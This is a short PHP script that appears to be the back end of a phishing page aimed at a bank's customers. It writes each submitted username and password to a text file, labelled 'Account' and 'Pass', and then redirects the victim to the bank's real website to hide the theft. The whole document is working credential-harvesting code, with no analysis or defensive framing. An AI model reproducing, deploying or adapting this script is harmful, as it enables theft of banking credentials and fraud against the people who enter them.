<?php

file_put_contents("usernames.txt", "Account: " . $_POST['user'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://www.v-bank.com/');
exit();
